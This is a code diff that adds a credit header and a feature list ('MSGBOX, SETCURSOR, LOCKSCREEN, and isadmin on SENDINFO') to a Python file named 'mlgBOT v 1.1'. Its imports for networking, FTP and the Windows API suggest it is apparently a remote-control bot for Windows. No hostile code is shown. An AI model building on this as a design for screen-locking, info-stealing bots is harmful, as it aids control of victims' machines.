@@ -1,6 +1,8 @@
 # -*- coding: cp1252 -*-
 
-
+# mlgBOT v 1.1 coded by S4mick 
+# you can use the code as long as you credit me @s4mick - s4mick.blogspot.com - s4mick.com
+#ADDED MSGBOX,SETCURSOR,LOCKSCREEN, and isadmin on SENDINFO
 import os,urllib2,base64,ctypes
 import socket, sys, os,time ,random,platform ,ftplib
 import win32gui, win32ui, win32con, win32api
